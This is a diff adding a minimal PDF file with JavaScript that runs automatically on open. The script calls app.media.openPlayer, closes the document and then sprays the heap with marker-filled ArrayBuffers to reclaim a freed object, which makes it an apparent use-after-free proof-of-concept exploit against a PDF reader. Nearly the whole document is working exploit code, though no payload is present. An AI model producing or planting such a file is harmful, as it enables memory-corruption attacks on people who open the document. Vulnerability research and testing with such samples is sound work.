@@ -1,0 +1,48 @@
+%PDF 
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>> 
+2 0 obj
+<</S /JavaScript /JS (
+//main document open action
+
+var sprayArr = [];
+function start(msg) {
+    Math.atan(msg);
+}
+
+function end(msg) {
+    Math.asin(msg);
+}
+
+
+function replacefreed(size,nrofimes)
+{
+	var arr = new Array(nrofimes);  // replace freed LFH object = might take 30 allocs (or more) to get it back
+    for (var i = 0; i < arr.length; i++) {
+        arr[i] = new ArrayBuffer(size);
+        var ourdata = new Int32Array(arr[i]);
+
+        ourdata[0x00] = 0x41414141;
+        ourdata[0x01] = 0x42424242;
+        ourdata[0x02] = 0x43434343;
+        ourdata[0x03] = 0x44444444;
+        ourdata[0x04] = 0x45454545;
+       
+        for (var j = 0x05; j < ourdata.length; j++) {
+            ourdata[j] = 0x46464646;
+        }
+    }
+}
+
+//main document open action
+this.pageNum =  0;
+global.a = this.app.media.openPlayer({}); 
+this.closeDoc();
+replacefreed(0x24,1000);
+replacefreed(0x24,1000);
+replacefreed(0x24,1000);
+
+
+//page close action
+app.alert(global.a.isOpen);
+)>> trailer <</Root 1 0 R>>
